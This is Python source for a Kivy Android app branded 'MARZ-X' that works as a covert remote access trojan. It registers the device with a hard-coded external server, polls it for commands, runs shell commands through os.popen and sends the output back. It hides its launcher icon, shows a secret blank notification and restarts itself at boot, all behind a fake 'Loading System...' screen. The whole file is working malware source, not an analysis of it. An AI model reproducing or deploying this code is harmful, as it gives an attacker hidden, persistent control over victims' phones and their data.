import threading
import requests
import time
import os
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.utils import platform

BASE_URL = "https://web-production-1769.up.railway.app"
POLL_INTERVAL = 10

if platform == 'android':
    from jnius import autoclass
    Build = autoclass('android.os.Build')
    DEVICE_ID = "device_" + Build.MODEL.replace(" ", "_")
    DEVICE_NAME = Build.MODEL
    OS = "Android"
else:
    DEVICE_ID = "device_" + os.uname().nodename
    DEVICE_NAME = os.uname().nodename
    OS = "Linux"

def start_background_service():
    if platform != 'android':
        return
    try:
        from jnius import autoclass
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.RECEIVE_BOOT_COMPLETED,
            Permission.FOREGROUND_SERVICE,
            Permission.WAKE_LOCK,
            Permission.SYSTEM_ALERT_WINDOW,
            Permission.POST_NOTIFICATIONS
        ])
        PythonService = autoclass('org.kivy.android.PythonService')
        service = PythonService.mService
        NotificationManager = autoclass('android.app.NotificationManager')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        NotificationCompat = autoclass('androidx.core.app.NotificationCompat')
        Context = autoclass('android.content.Context')
        channel = NotificationChannel("marzx_channel", "Service", NotificationManager.IMPORTANCE_MIN)
        manager = service.getSystemService(Context.NOTIFICATION_SERVICE)
        manager.createNotificationChannel(channel)
        notification = NotificationCompat.Builder(service, "marzx_channel")
        notification.setContentTitle(".")
        notification.setContentText(".")
        notification.setSmallIcon(service.getApplicationInfo().icon)
        notification.setPriority(NotificationCompat.PRIORITY_MIN)
        notification.setVisibility(NotificationCompat.VISIBILITY_SECRET)
        service.startForeground(1, notification.build())
        from android.broadcast import BroadcastReceiver
        class BootReceiver(BroadcastReceiver):
            def onReceive(self, context, intent):
                service.startService(service.getIntent())
        BootReceiver().register('android.intent.action.BOOT_COMPLETED')
        from android.alarm import AlarmManager
        alarm = AlarmManager()
        alarm.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, 30000, 30000, service.getIntent())
        pm = service.getPackageManager()
        component = service.getComponentName()
        pm.setComponentEnabledSetting(component, pm.COMPONENT_ENABLED_STATE_DISABLED, pm.DONT_KILL_APP)
        print("✅ Background aktif")
    except Exception as e:
        print("❌ Service error:", e)

def register_device():
    try:
        data = {"id": DEVICE_ID, "name": DEVICE_NAME, "os": OS, "ip": "0.0.0.0", "country": "ID"}
        requests.post(f"{BASE_URL}/api/register", json=data, timeout=5)
        print("✅ Registered:", DEVICE_ID)
    except Exception as e:
        print("❌ Register gagal:", e)

def poll_command():
    while True:
        try:
            req = requests.post(f"{BASE_URL}/api/poll", json={"id": DEVICE_ID}, timeout=5)
            cmd = req.json().get("command")
            if cmd:
                print("📩 Perintah:", cmd)
                if cmd.startswith("shell "):
                    result = os.popen(cmd[6:]).read()
                else:
                    result = f"OK: {cmd}"
                requests.post(f"{BASE_URL}/api/result", json={"id": DEVICE_ID, "result": result})
                print("✅ Hasil dikirim")
        except Exception as e:
            print("❌ Polling error:", e)
        time.sleep(POLL_INTERVAL)

def start_client():
    register_device()
    poll_command()

class ArzClientApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        label = Label(text="[b]MARZ-X[/b]\nLoading System...", font_size=30, markup=True, halign='center', valign='center')
        layout.add_widget(label)
        return layout
    def on_start(self):
        if platform == 'android':
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                pm = activity.getPackageManager()
                component = activity.getComponentName()
                pm.setComponentEnabledSetting(component, pm.COMPONENT_ENABLED_STATE_DISABLED, pm.DONT_KILL_APP)
                print("✅ Ikon disembunyikan")
            except Exception as e:
                print("❌ Gagal sembunyikan ikon:", e)
        threading.Thread(target=start_background_service, daemon=True).start()
        threading.Thread(target=start_client, daemon=True).start()

if __name__ == "__main__":
    ArzClientApp().run()
